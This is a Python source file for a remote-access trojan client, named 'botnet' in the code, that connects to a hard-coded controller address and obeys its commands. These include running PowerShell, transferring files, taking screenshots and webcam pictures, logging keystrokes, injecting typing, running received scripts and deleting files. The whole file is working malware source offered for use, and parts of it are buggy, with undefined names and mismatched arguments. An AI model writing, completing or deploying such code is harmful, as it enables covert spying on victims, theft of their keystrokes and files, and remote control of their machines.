import socket
import pickle
import os
import cv2
import shutil
import pyautogui
import subprocess
import numpy
from threading import Thread
from datetime import datetime
from pynput.keyboard import Listener

class botnet:
	"""docstring for botnet"""
	def __init__(self,host,port):
		self.finish_time = 25
		self.encoding_format = 'utf-8'
		self.host = host
		self.port = port
		self.client = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
		self.buffer_size = 1024

	def encoded(self,msg):
		return msg.encode(self.encoding_format)

	def recv_command(self):
		return pickle.loads(self.client.recv(self.buffer_size))

	def reconnect(self):
		self.client.shutdown(socket.SHUT_WR)
		self.client.close()
		self.client = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
		self.client.connect((self.host,self.port))

	def start_extract(self):
		self.extract_zip_thread = Thread(target=self.extract_zip)
		self.extract_zip_thread.start()

	def start_archive(self):
		self.archive_dir_thread = Thread(target=self.archive)
		self.archive_dir_thread.start()

	def start_keylogger(self):
		self.keylogger_thread = Thread(target=self.keylogger)
		self.keylogger_thread.start()

	def stop_keylogger(self):
		self.finish_time=datetime.datetime.now().hour

	def make_dir(self,parent_dir,name_dir):
		cwd = os.getcwd()
		os.chdir(parent_dir)
		os.mkdir(name_dir)
		os.chdir(cwd)

	def remove_dir(self,path_directory):
		shutil.rmtree(path_directory)

	def remove_file(self,path_file):
		os.remove(path_file)

	def open_file(self,path_file):
		os.system(path_file)

	def execute_powershell(self,command):
		p1=subprocess.run(['powershell.exe',command],shell=True,capture_output=True,text=True)
		self.client.send(self.encoded(p1.stdout))
		self.client.send(self.encoded(''))

	def send_file(self,path):
		with open(path,'rb') as f:
			file_data = f.read(self.buffer_size)

			while file_data:
				self.client.send(file_data)
				file_data = f.read(self.buffer_size)

			self.reconnect()

	def recieve_file(self,name):
		with open(name,'wb') as f:
			file_data = self.client.recv(self.buffer_size)

			while file_data:
				f.write(file_data)
				file_data = self.client.recv(self.buffer_size)

			self.reconnect()

	def extract_zip(self,zip_path,dir_name):
		#dir_name = os.path.basename(zip_path).replace('.zip','')
		with ZipFile(zip_path,'r') as f:
			f.extractall(dir_name)

	def archive(self,folder,zip_name):
		#zip_name = os.path.basename(folder)+'.zip'

		folder = os.path.join(folder,'')
		current_path = os.getcwd()
		folder_path  = os.path.join(current_path,folder)
		zip_path     = os.path.join(current_path,zip_name)

		os.chdir(folder)

		with ZipFile(zip_path,'w',compression=ZIP_DEFLATED) as myzip:
			for root,dirs,files in os.walk(folder_path):
				for file in files:
					root = root.replace(folder_path,'')
					file = os.path.join(root,file)
					myzip.write(file)

	def screenshot(self):
		image = cv2.cvtColor(numpy.array(pyautogui.screenshot()),cv2.COLOR_RGB2BGR)
		file_name = 'screenshot.png'

		cv2.imwrite(file_name, image)

		with open(file_name,'rb') as f:
			file_contents=f.read(self.buffer_size)
			while file_contents:
				self.client.send(file_contents)
				file_contents=f.read(self.buffer_size)

		os.remove(file_name)
		self.reconnect()

	def camera(self):
		cam = cv2.VideoCapture(0)
		ret,frame = cam.read()
		file_name = 'camera.png'
		cv2.imwrite(file_name, frame)

		with open(file_name,'rb') as f:
			file_contents=f.read(self.buffer_size)
			while file_contents:
				self.client.send(file_contents)
				file_contents=f.read(self.buffer_size)

		os.remove(file_name)
		self.reconnect()

	def keyboard(self):
		option=int(self.recv_command())
		if option==1:
			name = 'script.pyw'
			with open(name,'w') as f:
				file_contents = self.recv_command()
				while file_contents:
					f.write(file_data)
					file_data = self.recv_command()

			os.system(name)
			os.remove(name)
			self.reconnect()

		elif option==2:
			while True:
				string = self.recv_command()+'\n'
				if string=='exit\n':
					return
				else:
					for i in string:
						pyautogui.typewrite(i)

	def keylogger(self):
		string = ''
		file_name = str(datetime.today().date())+'.txt'
		path = os.path.join(self.home,'logs',file_name)

		def write(key):
			nonlocal l,string
			key=str(key)
			with open(path,'a') as f:
				if datetime.now().hour >= self.finish_time:
					f.write(string+'\n')
					l.stop()
				else:
					if key=='Key.enter':
						f.write(string+'\n')
						string=''

					elif key=='Key.space':
						string+=' '
	
					elif 'Key' in key:
						string+='~'+key+'~'

					else:
						string+=key.replace("'","")

		with Listener(on_press=write) as l:
			if 'logs' not in listdir(home):
				mkdir('logs')
			l.join()

	def popup(self,title,msg,ptype):
		root = Tk()
		root.withdraw()

		if ptype=='error':
			messagebox.showerror(title,message)
		elif ptype=='warning':
			messagebox.showwarning(title,message)
		elif ptype=='info':
			messagebox.showinfo(title,message)
		root.destroy()

	def run(self):
		self.client.connect((self.host,self.port))
		while True:
			server_command = self.recv_command()

			if server_command[0]=='send file':
				self.recieve_file(server_command[1])

			elif server_command[0]=='recieve file':
				self.send_file(server_command[1])

			elif server_command[0]=='open file':
				self.open_file(server_command[1])

			elif server_command[0]=='popup':
				self.popup(server_command[1],server_command[2],server_command[3])

			elif server_command[0]=='make directory':
				self.make_dir(server_command[1],server_command[2])

			elif server_command[0]=='remove file':
				self.remove_file(server_command[1])

			elif server_command[0]=='remove directory':
				self.remove_dir(server_command[1])

			elif server_command[0]=='keyboard access':
				self.keyboard(server_command[1])

			elif server_command[0]=='screenshot':
				self.screenshot()

			elif server_command[0]=='take picture':
				self.camera()

			elif server_command[0]=='start keylogger':
				self.start_keylogger()

			elif server_command[0]=='stop keylogger':
				self.stop_keylogger()

			elif server_command[0]=='extract':
				self.start_extract(server_command[1],server_command[2])

			elif server_command[0]=='archive':
				self.start_archive(server_command[1],server_command[2])

			elif server_command[0]=='powershell':
				self.execute_powershell(server_command[1])

			elif server_command[0]=='exit':
				break











tg = botnet('192.168.18.3',5050)
tg.run()

